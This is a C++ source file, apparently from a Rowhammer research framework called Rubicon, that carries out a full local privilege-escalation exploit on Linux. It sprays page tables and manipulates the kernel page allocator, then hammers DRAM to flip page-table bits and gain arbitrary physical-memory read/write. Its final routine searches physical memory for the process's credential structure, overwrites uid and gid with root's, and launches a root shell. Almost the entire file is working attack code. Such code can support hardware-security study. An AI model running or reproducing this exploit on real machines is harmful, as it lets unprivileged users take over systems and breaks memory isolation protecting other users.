#include "rubicon.h"
// #include "rubench.hpp"

#include "hammer/bit_flips.hpp"
#include "hammer/jitted.hpp"

#include <cstring>
#include <fcntl.h>
#include <immintrin.h>
#include <set>
#include <string>
#include <sys/mman.h>
#include <cstdint>
#include <cstdio>
#include <string>
#include <setjmp.h>
#include <signal.h>
#include <stddef.h>

#include <random>
#include <unistd.h>

/**
 * @struct cred
 * @brief Structure representing the credentials of a task.
 *
 * The `usage` field is a usage counter that keeps track of the number of references to
 * the credentials structure.
 */
struct cred {
    int usage; /* usage counter */
    int uid;   /* real UID of the task */
    int gid;   /* real GID of the task */
    int suid;  /* saved UID of the task */
    int sgid;  /* saved GID of the task */
    int euid;  /* effective UID of the task */
    int egid;  /* effective GID of the task */
    int fsuid; /* UID for VFS ops */
    int fsgid; /* GID for VFS ops */
};

#define REPEATABILITY_ROUNDS 8
#define HAMMER_ROUNDS 1
#define PAGE_SIZE 0x1000UL
#define PTE_FLAGS 0x8000000000000027
#define NR_VMA_LIMIT 63000
#define PAGE_TABLE_BACKED_SIZE 0x200000UL
#define SPRAY_BASE 0x200000000UL
#define PCP_PUSH_SIZE 0x2000000UL
#define EVICT_SIZE 0x8000000UL

#define MB(x) ((x) * 1024 * 1024)
#define FLUSH_SIZE MB(128)

/** Structure of an empty PTE. */
#define PTE_EMPTY          0x8000000000000027UL

/** Physical address to start searching for struct cred. */
#define PHYS_START         0x100000000UL

/** Search strobe for searching task's struct cred.*/
#define CRED_SEARCH_STROBE 0x10UL


#define bitmask_to_64bit(bitmask, addr) \
    (static_cast<uint64_t>(bitmask) << ((reinterpret_cast<uint64_t>(addr) % 8) * 8))
#define align(value, alignment) ((value) & ~((alignment)-1))
#define align_ptr_to_page(addr) \
    (reinterpret_cast<void*>(align(reinterpret_cast<uintptr_t>(addr), PAGE_SIZE)))

static std::string flags_to_str(uint64_t e) {
    bool P  = e & (1ull << 0);
    bool RW = e & (1ull << 1);
    bool US = e & (1ull << 2);
    bool PWT= e & (1ull << 3);
    bool PCD= e & (1ull << 4);
    bool A  = e & (1ull << 5);
    bool D  = e & (1ull << 6);
    bool PS = e & (1ull << 7);   // large page if set in PDE/PDPTE
    bool G  = e & (1ull << 8);
    bool NX = e & (1ull << 63);

    char buf[128];
    std::snprintf(buf, sizeof(buf),
                  "P=%d RW=%d US=%d PWT=%d PCD=%d A=%d D=%d PS=%d G=%d NX=%d",
                  P, RW, US, PWT, PCD, A, D, PS, G, NX);
    return std::string(buf);
}


void dump_page_table(void* frame) {
    auto* entries = reinterpret_cast<uint64_t*>(frame);

    for (int i = 0; i < 512; i++) {
        uint64_t e = entries[i];
        if (e & 0x1) { // Present
            //                                0x8000000000000027ULL
            //                                0x80000002a9062067
            uint64_t addr = e & 0x000FFFFFFFFFF000ULL;
            std::printf("[%3d] entry=%#018llx phys=%#018llx %s\n",
                        i,
                        (unsigned long long)e,
                        (unsigned long long)addr,
                        flags_to_str(e).c_str());
        } else {
            // Uncomment if you also want to see not-present entries
            // std::printf("[%3d] not present\n", i);
        }
    }
}

static jmp_buf jmp_env;

// Segfault handler (sigaction signature)
static void segfault_handler(int signum, siginfo_t *info, void *context) {
    (void) signum;
    (void) context;
    printf("Caught segfault at address %p\n", info->si_addr);
    longjmp(jmp_env, 1);
}

/** Checks whether the memory matches the struct creds structure. */
static int match_creds(struct cred *our_creds, struct cred *to_check) {
    if (to_check->usage < 2) /* We don't know usage counter, but it should be > 1*/
        return 0;

    // check the other fields
    char *a = ((char *) to_check) + 4;
    char *b = ((char *) our_creds) + 4;
    return memcmp(a, b, sizeof(*our_creds) - 4) == 0;
}

static char *evict_ptr;

int init_evict_ptr() {
    if (evict_ptr)
        return 0;

    evict_ptr = (char*)mmap(NULL, FLUSH_SIZE, PROT_READ | PROT_WRITE,
                     MAP_ANONYMOUS | MAP_SHARED | MAP_POPULATE, -1, 0);

    return evict_ptr != MAP_FAILED;
}

void evict_tlb_4k() {
    for (char *flush_it = evict_ptr; flush_it < evict_ptr + FLUSH_SIZE;
         flush_it += 0x1000UL)
        *flush_it = 0;
}

static void setup_pt(uint64_t *corrupt, uint64_t paddr) {
    /* first PTE is reserved */
    for (int i = 0; i < 511; ++i) {
        corrupt[i + 1] = PTE_EMPTY | (paddr + i * sysconf(_SC_PAGESIZE));
    }
}

Rubicon::Rubicon() {
    std::random_device rd;
    gen = std::mt19937(rd());

    // Mask to extract offset within a 4 KiB page directory range.
    alignment = 0x80000UL;
}

void Rubicon::restore_page(int* page_ptr) {
    srand(static_cast<unsigned int>(reinterpret_cast<uint64_t>(page_ptr) * getpagesize()));
    for(size_t j = 0; j < PAGE_SIZE / sizeof(int); ++j) {
        page_ptr[j] = rand();
    }
}

/* helper: does this pass contain a flip with the same address+mask? */
static bool occurs_again(const std::vector<bit_flip_info_t>& pass,
                         const bit_flip_info_t& flip) {
    for(const auto& f : pass) {
        if(f.address == flip.address && f.flipped_mask == flip.flipped_mask) {
            return true;
        }
    }
    return false;
}

void Rubicon::open_spraying_file(void* file_target) {
    const char* buf  = "ffffffffffffffff";
    const size_t len = strlen(buf); /* 16 bytes */

    auto fatal = [](const char* where) [[noreturn]] {
        fprintf(stderr, "[fatal] %s: %s\n", where, strerror(errno));
        std::terminate(); /* or exit(EXIT_FAILURE); */
    };

    fd_spray = open("/dev/shm", O_TMPFILE | O_RDWR, S_IRUSR | S_IWUSR);
    if(fd_spray == -1) {
        fatal("open(/dev/shm)");
    }

    block_merge(file_target, 0);

    if(write(fd_spray, buf, len) != static_cast<ssize_t>(len)) {
        fatal("write");
    }

    file_ptr = mmap(nullptr, PAGE_SIZE, PROT_READ | PROT_WRITE,
                    MAP_SHARED | MAP_POPULATE, fd_spray, 0);
    if(file_ptr == MAP_FAILED) {
        fatal("mmap");
    }

    if(mlock(file_ptr, PAGE_SIZE) == -1) {
        fatal("mlock");
    }
}

void Rubicon::close_spraying_file() {
    munlock(file_ptr, PAGE_SIZE);
    munmap(file_ptr, PAGE_SIZE);
    close(fd_spray);
}

int Rubicon::spray_tables() {
    printf("[+] Spraying page tables (base = 0x%lx, limit = %u).\n",
           static_cast<unsigned long>(SPRAY_BASE), NR_VMA_LIMIT);

    auto fatal = [](const char* where) [[noreturn]] {
        fprintf(stderr, "[fatal] %s: %s\n", where, strerror(errno));
        std::terminate();
    };

    unsigned collisions = 0U;

    for(unsigned i = 1U; i < NR_VMA_LIMIT; ++i) {
        void* addr = reinterpret_cast<void*>(SPRAY_BASE + PAGE_TABLE_BACKED_SIZE * i);

        void* ret = mmap(addr, PAGE_SIZE, PROT_READ | PROT_WRITE,
                         MAP_FIXED_NOREPLACE | MAP_SHARED | MAP_POPULATE, fd_spray, 0);

        if(ret == MAP_FAILED) {
            if(errno == EEXIST) {
                ++collisions;
                printf("  ⚠  collision at index %u  addr=%p\n", i, addr);
                continue; /* skip and keep spraying */
            }
            fatal("mmap(spray_tables)");
        }
    }

    // printf("Spray complete — %u collision%s skipped\n", collisions,
    //        (collisions == 1U ? "" : "s"));

    /* return 0 on a perfect spray, 1 if holes were left */
    return (collisions == 0U) ? 0 : 1;
}

std::vector<bit_flip_info_t>
Rubicon::repeatable_bit_flips(hammer_fn_t hammer_fn,
                              const hammer_pattern_t& pat,
                              int pattern_repetitions,
                              int self_sync_thresh,
                              const std::vector<bit_flip_info_t>& orig_flips,
                              int max_passes /* =3 */) {
    /* ── early exit ─────────────────────────────────────────────── */
    if(orig_flips.empty()) {
        puts("[repeatable] no flips to verify – nothing to do");
        return {};
    }

    printf("[repeatable] %zu candidate flips to verify over %d pass%s\n",
           orig_flips.size(), max_passes, max_passes == 1 ? "" : "es");

    /* ── cumulative bookkeeping ────────────────────────────────── */
    std::vector<bool> seen(orig_flips.size(), false); // flip survived ≥1 pass?
    std::vector<bit_flip_info_t> survivors;           // final result
    survivors.reserve(orig_flips.size());

    /* ── constants & helpers ───────────────────────────────────── */
    constexpr uint64_t pattern_aggr = 0x80000000AAAAAA27ULL;
    constexpr uint64_t pattern_vict = 0x8000000055555527ULL;

    auto aggr_rows = pattern_aggressors(pat);
    auto vict_rows = pattern_victims(pat);

    static std::mt19937_64 rng{ std::random_device{}() };
    static std::uniform_int_distribution<uint64_t> dist(0, (1ULL << 18) - 1);

    /* ── main loop ─────────────────────────────────────────────── */
    for(int pass = 0; pass < max_passes; ++pass) {

        /* if every flip has repeated at least once, stop early */
        if(std::all_of(seen.begin(), seen.end(), [](bool b) { return b; })) {
            puts("  all flips have repeated at least once – stopping early");
            break;
        }

        size_t remaining = std::count(seen.begin(), seen.end(), false);
        printf("  pass %d/%d – %zu candidates still unchecked …\n", pass + 1,
               max_passes, remaining);

        /* refresh data pattern in DRAM */
        initialize_data_pattern(aggr_rows, pattern_aggr);
        initialize_data_pattern(vict_rows, pattern_vict);

        /* build list of (PTE pointer, expected value) for ALL flips */
        struct track_t {
            uint64_t* ptr;
            uint64_t expect;
        };
        std::vector<track_t> track(orig_flips.size());

        for(size_t idx = 0; idx < orig_flips.size(); ++idx) {
            const auto& bf    = orig_flips[idx];
            uint64_t* pte_ptr = (uint64_t*)(bf.address.to_virt());

            uint64_t known_bits =
                (reinterpret_cast<uintptr_t>(pte_ptr) & (alignment - 1)) &
                ~(PAGE_SIZE - 1);

            uint64_t pte_template = PTE_FLAGS | known_bits;
            uint64_t random_bits  = dist(rng) << 22; // 18-bit PFN
            uint64_t pte          = pte_template | random_bits;
            uint64_t expect       = pte ^ bf.flipped_mask;

            // install test value
            void* pt_page = align_ptr_to_page(bf.address.to_virt());
            memset(pt_page, 0, PAGE_SIZE);
            *pte_ptr = pte;

            track[idx] = { pte_ptr, expect };
        }
        _mm_sfence();

        /* hammer the pattern */
        hammer_fn(pat, pattern_repetitions, self_sync_thresh);

        /* check which flips re-appeared */
        printf("      new repeats this pass:\n");

        for(size_t idx = 0; idx < orig_flips.size(); ++idx) {
            _mm_clflushopt(track[idx].ptr);
            _mm_mfence();

            uint64_t obs = *track[idx].ptr;
            if(obs == track[idx].expect) {
                if(!seen[idx]) { // first time we see it repeat
                    seen[idx] = true;
                    survivors.push_back(orig_flips[idx]);
                    printf("        VA=%p  mask=0x%lx\n",
                           orig_flips[idx].address.to_virt(), orig_flips[idx].flipped_mask);
                }
            }
        }

        printf("      cumulative survivors after pass %d: %zu\n", pass + 1,
               survivors.size());
    }

    /* ── final summary ─────────────────────────────────────────── */
    printf("[repeatable] finished – %zu flips re-appeared in ≥1 pass\n",
           survivors.size());

    if(!survivors.empty()) {
        printf("  repeatable flips:\n");
        for(const auto& bf : survivors) {
            printf("    VA=%p  mask=0x%lx\n", bf.address.to_virt(), bf.flipped_mask);
        }
    }
    putchar('\n');
    return survivors;
}

/* ============================================================================
 *  repeatable_bit_flips_data()  –  keep flip if it re-appears in ≥ 1 pass
 * ----------------------------------------------------------------------------
 *  • uses collect_bit_flips() instead of per-PTE templates
 *  • otherwise identical call signature so it can replace the original
 * ==========================================================================*/
std::vector<bit_flip_info_t>
Rubicon::repeatable_bit_flips_data(hammer_fn_t hammer_fn,
                                   const hammer_pattern_t& pat,
                                   int pattern_repetitions,
                                   int self_sync_thresh,
                                   const std::vector<bit_flip_info_t>& orig_flips,
                                   int max_passes /* =3 */
) {
    /* ── early exit ─────────────────────────────────────────────── */
    if(orig_flips.empty()) {
        puts("[repeatable-data] no flips to verify – nothing to do");
        return {};
    }

    printf("[repeatable-data] %zu candidate flips to verify over %d pass%s\n",
           orig_flips.size(), max_passes, max_passes == 1 ? "" : "es");

    /* ── cumulative bookkeeping ────────────────────────────────── */
    std::vector<bool> seen(orig_flips.size(), false); // flip survived ≥1 pass?
    std::vector<bit_flip_info_t> survivors;           // final result
    survivors.reserve(orig_flips.size());

    /* ── constants & helpers ───────────────────────────────────── */
    constexpr uint64_t pattern_aggr = 0x80000000AAAAAA27ULL; // arbitrary
    constexpr uint64_t pattern_vict = 0x8000000055555527ULL; // expected victim data

    auto aggr_rows = pattern_aggressors(pat); // aggressor rows
    auto vict_rows = pattern_victims(pat);    // victim rows (addresses)

    /* ── main loop ─────────────────────────────────────────────── */
    for(int pass = 0; pass < max_passes; ++pass) {

        /* if every flip has repeated at least once, stop early */
        if(std::all_of(seen.begin(), seen.end(), [](bool b) { return b; })) {
            puts("  all flips have repeated at least once – stopping early");
            break;
        }

        size_t remaining = std::count(seen.begin(), seen.end(), false);
        printf("  pass %d/%d – %zu candidates still unchecked …\n", pass + 1,
               max_passes, remaining);

        /* refresh data pattern in DRAM */
        initialize_data_pattern(aggr_rows, pattern_aggr);
        initialize_data_pattern(vict_rows, pattern_vict);

        /* hammer the pattern */
        hammer_fn(pat, pattern_repetitions, self_sync_thresh);

        /* collect flips from DRAM */
        auto observed = collect_bit_flips(vict_rows, pattern_vict);

        /* mark any flip that re-appeared */
        printf("      new repeats this pass:\n");

        for(const auto& bf_obs : observed) {
            for(size_t idx = 0; idx < orig_flips.size(); ++idx) {
                if(seen[idx]) // already counted
                    continue;

                const auto& bf_ref = orig_flips[idx];
                if(bf_ref.address == bf_obs.address &&
                   bf_ref.flipped_mask == bf_obs.flipped_mask) {
                    seen[idx] = true;
                    survivors.push_back(bf_ref);

                    printf("        VA=%p  mask=0x%lx\n",
                           bf_ref.address.to_virt(), bf_ref.flipped_mask);
                    break;
                }
            }
        }

        printf("      cumulative survivors after pass %d: %zu\n", pass + 1,
               survivors.size());
    }

    /* ── final summary ─────────────────────────────────────────── */
    printf("[repeatable-data] finished – %zu flips re-appeared in ≥1 pass\n",
           survivors.size());

    if(!survivors.empty()) {
        printf("  repeatable flips:\n");
        for(const auto& bf : survivors) {
            printf("    VA=%p  mask=0x%lx\n", bf.address.to_virt(), bf.flipped_mask);
        }
    }
    putchar('\n');
    return survivors;
}


void Rubicon::unspray_tables() {
    for(unsigned i = 1; i < NR_VMA_LIMIT; ++i) {
        void* addr = reinterpret_cast<void*>(SPRAY_BASE + PAGE_TABLE_BACKED_SIZE * i);
        if(munmap(addr, PAGE_SIZE)) {
            printf("Failed to unspray tables\n");
            exit(EXIT_FAILURE);
        }
    }
}

void Rubicon::huge_split(void* sacrificial_page) {
    madvise(sacrificial_page, PAGE_SIZE, MADV_FREE);
}

int Rubicon::block_merge(void* target, unsigned order) {
    if(munmap(target, PAGE_SIZE << order)) {
        return -1;
    }

    if(order == 0) {
        return 0;
    }

    void* flush_ptr = mmap(NULL, PCP_PUSH_SIZE, PROT_READ | PROT_WRITE,
                           MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
    if(flush_ptr == MAP_FAILED) {
        return -1;
    }

    return munmap(flush_ptr, PCP_PUSH_SIZE);
}

int Rubicon::migratetype_escalation(std::vector<void*>& bait_pages) {
    unsigned long exhaust_size =
        sysconf(_SC_AVPHYS_PAGES) * sysconf(_SC_PAGESIZE) - 0x10000000UL;
    void* exhaust_ptr = mmap(NULL, exhaust_size, PROT_READ | PROT_WRITE,
                             MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);

    if(exhaust_ptr == MAP_FAILED) {
        printf("escalation: Failed to mmap exhaust_ptr\n");
    }

    for(void* page : bait_pages) {
        if(munmap(page, PAGE_SIZE)) {
            printf("escalation: Failed to unmap page %p\n", page);
        }
    }

    spray_tables();

    return munmap(exhaust_ptr, exhaust_size);
}


bool Rubicon::is_exploitable(const bit_flip_info_t& bit_flip) const {
    uint64_t bitflip_address64 = reinterpret_cast<uint64_t>(bit_flip.address.to_virt());
    uint64_t bitflip_mask64      = bit_flip.flipped_mask;
    uint64_t bitflip_corrupted64 = bit_flip.corrupted_value;

    const uint64_t forbidden              = ~(alignment - 1) | (PAGE_SIZE - 1);
    const uint64_t touches_forbidden_bits = bitflip_mask64 & forbidden;

    const bool corrupts_masked_bits = ((bitflip_address64 & bitflip_mask64) ^
                                       (bitflip_corrupted64 & bitflip_mask64));

    return !touches_forbidden_bits && !corrupts_masked_bits;
}

std::vector<bit_flip_info_t>
Rubicon::filter_exploitable(const std::vector<bit_flip_info_t>& flips) const {
    std::vector<bit_flip_info_t> out;
    out.reserve(flips.size());

    for(auto& bf : flips) {
        if(is_exploitable(bf)) {
            out.push_back(bf);
        }
    }
    out.shrink_to_fit();
    return out;
}


void Rubicon::e2e(hammer_fn_t hammer_fn,
                  const hammer_pattern_t& pat,
                  int pattern_repetitions,
                  int self_sync_thresh,
                  const std::vector<volatile char*>& aggressors,
                  const std::vector<volatile char*>& sync_rows,
                  const std::vector<bit_flip_info_t>& bit_flips,
                  int hammer_rounds) {

    // printf(" ──[Rubicon::e2e]─────────────────────────────────────────────\n");
    // printf("  pattern repetitions : %d\n", pattern_repetitions);
    // printf("  self-sync threshold : %d\n", self_sync_thresh);
    // printf("  aggressors     : %zu\n", aggressors.size());
    // printf("  randoms : %zu\n", sync_rows.size());
    // printf("  bit-flips detected  : %zu\n", bit_flips.size());
    // printf(
    //     " ───────────────────────────────────────────────────────────────\n");


    for(const auto& bitflip : bit_flips) {
        auto bitflip_address64 =
            reinterpret_cast<uint64_t>(bitflip.address.to_virt());
        uint64_t bitflip_mask64      = bitflip.flipped_mask;
        uint64_t bitflip_corrupted64 = bitflip.corrupted_value;

        printf("[+] Testing bitflip @ %p.\n", bitflip.address.to_virt(), bitflip_mask64);
        // printf("  Address: %p\n", bitflip.address.to_virt());
        // printf("  Bitmask: %lx\n", bitflip_mask64);
        // printf("  Corrupted data: %lx\n", bitflip_corrupted64);

        void* file_target = align_ptr_to_page(bitflip_address64 ^ bitflip_mask64);
        void* table_target = align_ptr_to_page(bitflip_address64);

        mlock(table_target, PAGE_SIZE);

        printf("[+] Massaging memory using Rubicon primitives.\n");

        std::set<void*> aggressor_pages;
        for(const auto& aggressor : aggressors) {
            void* aggressor_page = align_ptr_to_page(aggressor);
            aggressor_pages.insert(aggressor_page);
            mlock(aggressor_page, PAGE_SIZE);
            if(mlock(aggressor_page, PAGE_SIZE)) {
                printf("Failed to lock aggressor page %p\n", aggressor_page);
            }
        }
        for(const auto& aggressor : sync_rows) {
            void* aggressor_page = align_ptr_to_page(aggressor);
            aggressor_pages.insert(aggressor_page);
            if(mlock(aggressor_page, PAGE_SIZE)) {
                printf("Failed to lock aggressor page %p", aggressor_page);
            }
        }

        uint64_t block64;
        uint64_t bait_range;
        block64    = align(bitflip_address64, PAGE_SIZE) - 0x200000UL;
        bait_range = 0x400000UL;

        void* block = align_ptr_to_page(block64);
        std::vector<void*> bait_pages;
        for(uint64_t offset = 0; offset < bait_range; offset += PAGE_SIZE) {
            void* candidate =
                reinterpret_cast<void*>(reinterpret_cast<uint64_t>(block) + offset);
            if(candidate == table_target)
                continue;
            if(candidate == file_target)
                continue;
            if(aggressor_pages.find(candidate) == aggressor_pages.end()) {
                bait_pages.push_back(candidate);
            }
        }

        // printf("Block: %p\n", block);
        // printf("File target: %p\n", file_target);
        // printf("Table target: %p\n", table_target);

        // unsigned long file_target_pa  = rubench_va_to_pa(file_target);
        // unsigned long table_target_pa = rubench_va_to_pa(table_target);

        open_spraying_file(file_target);
        migratetype_escalation(bait_pages);

        unspray_tables();

        void* fetch_pds = reinterpret_cast<void*>(SPRAY_BASE);
        mmap(fetch_pds, PAGE_SIZE, PROT_READ | PROT_WRITE,
             MAP_FIXED | MAP_SHARED | MAP_POPULATE, fd_spray, 0);

        uint64_t pte_index     = (bitflip_address64 & (PAGE_SIZE - 1)) >> 3;
        uint64_t victim_offset = pte_index * PAGE_SIZE;
        uint64_t* victim =
            reinterpret_cast<uint64_t*>(SPRAY_BASE + PAGE_TABLE_BACKED_SIZE + victim_offset);
        munlock(table_target, PAGE_SIZE);
        block_merge(table_target, 0);
        mmap(victim, PAGE_SIZE, PROT_READ | PROT_WRITE,
             MAP_FIXED | MAP_SHARED | MAP_POPULATE, fd_spray, 0);

        void* evict_ptr = mmap(NULL, EVICT_SIZE, PROT_READ | PROT_WRITE,
                               MAP_ANONYMOUS | MAP_SHARED | MAP_POPULATE, -1, 0);
        for(char* evict_it = static_cast<char*>(evict_ptr);
            evict_it < static_cast<char*>(evict_ptr) + EVICT_SIZE; evict_it += PAGE_SIZE) {
            *evict_it = 0;
        }
        munmap(evict_ptr, EVICT_SIZE);

        // unsigned long value = rubench_read_phys(table_target_pa + pte_index * 8);
        // printf("Table target physical address: %lx\n", table_target_pa);
        // printf("File physical address: %lx\n", file_target_pa);
        // printf("Value read from target: %lx\n", value);

        printf("[+] Trying to retrigger the bit flip by hammering pattern for %dK times.\n", (hammer_rounds * pattern_repetitions)/1000);
        for(int k = 0; k < hammer_rounds; k++) {
            hammer_fn(pat, pattern_repetitions, self_sync_thresh);
        }

        _mm_clflushopt(&(victim[victim_offset >> 12]));
        _mm_mfence();

        // unsigned long value_after = rubench_read_phys(table_target_pa + pte_index * 8);
        //
        // printf("Value: %lx.", victim[victim_offset >> 12]);
        // printf("Value after: %lx.", value_after);

        const bool rw_achieved = (victim[victim_offset >> 12] & 0xff) == 0x27UL;
        if(!rw_achieved) {
            printf("[-] Failed to achieve R/W primitive.\n\n");
            munmap(victim, PAGE_SIZE);
            munmap(fetch_pds, PAGE_SIZE);
            for(const auto& aggressor : aggressor_pages) {
                if(munlock(aggressor, PAGE_SIZE)) {
                    printf("Failed to unmap aggressor page %p\n", aggressor);
                }
            }
            close_spraying_file();
            munmap(evict_ptr, EVICT_SIZE);
            return;
        }


        printf("[+] R/W primitive achieved! Trying to find and manipulate the process' cred struct now.\n");
        victim[0] = victim[victim_offset >> 12];
        victim = reinterpret_cast<uint64_t*>(SPRAY_BASE + PAGE_TABLE_BACKED_SIZE);

        init_evict_ptr();

        const uint64_t mem_total = sysconf(_SC_PHYS_PAGES) * sysconf(_SC_PAGESIZE);
        const int uid = static_cast<int>(getuid());
        const int gid = static_cast<int>(getgid());

        /* Field our_creds.usage can have any number. */
        struct cred our_creds = {-1, uid, gid, uid, gid, uid, gid, uid, gid};
        int cred_sz = sizeof(struct cred);

        static uint64_t offs;

        printf("[+] Searching for struct cred of our process (uid=%d, gid=%d) in physical memory...\n", uid, gid);
        for (uint64_t paddr = PHYS_START; paddr < PHYS_START + mem_total; paddr += 0x1ff000) {
            printf("[+] Searching within 511x 4K pages at physical address 0x%lx.\n", paddr);
            evict_tlb_4k();
            setup_pt(victim, paddr);
            evict_tlb_4k();

            // dump_page_table(victim);

            // Search across 511 pages.
            // Again, we do not check the first page because that's the self-referencing table.
            for (offs = sysconf(_SC_PAGESIZE); offs < MB(2) - cred_sz; offs += CRED_SEARCH_STROBE) {
                auto *cand = (struct cred *) &victim[offs];

                // Setjump for segfault handling.
                // In some cases, it might happen that the mapped range will segfault.
                // In particular, this may hinder the correct cleanup
                struct sigaction sa{};
                sa.sa_sigaction = segfault_handler;
                sigemptyset(&sa.sa_mask);
                sa.sa_flags = SA_SIGINFO;
                sigaction(SIGSEGV, &sa, NULL);

                // prepare jump
                if (setjmp(jmp_env) == 0) {
                    // Access the candidate
                    *(volatile int*)&cand->usage;
                } else {
                    // Segfault occurred, skip this candidate
                    continue;
                }

                // Clear the segfault handler
                sa.sa_handler = SIG_DFL;
                sigaction(SIGSEGV, &sa, NULL);

                // Check if the candidate is the same as our creds.
                if (!match_creds(&our_creds, cand)) {
                    continue;
                }

                // Set struct cred to the gid/uid of root.
                cand->uid = 0;
                cand->gid = 0;

                // barrier();
                __sync_synchronize();   // full memory barrier
                __atomic_thread_fence(__ATOMIC_SEQ_CST);

                // Check whether the uid of our process changed to root.
                if (getuid() != 0) {
                    // We flipped some other process' creds!
                    cand->uid = our_creds.uid;
                    cand->gid = our_creds.gid;
                    continue;
                }

//                clean_pt(_ptr(victim), original_pte);
                evict_tlb_4k();

                printf("[!] ATTACK SUCCEEDED ~ Got root shell!\n");
                // execl("/usr/bin/bash", "bash", NULL);

                execl("/usr/bin/script", "script", "-q", "/dev/null", "/usr/bin/bash", NULL);


                // if (execlp("/bin/bash", "bash", "-il", (char*)NULL) == -1) {
                //     perror("execlp");
                // }
            }
        }

        munmap(victim, PAGE_SIZE);
        munmap(fetch_pds, PAGE_SIZE);

        for(const auto& aggressor : aggressor_pages) {
            if(munlock(aggressor, PAGE_SIZE)) {
                printf("Failed to unmap aggressor page %p\n", aggressor);
            }
        }

        close_spraying_file();

        munmap(evict_ptr, EVICT_SIZE);

        exit(EXIT_SUCCESS);
    }
}
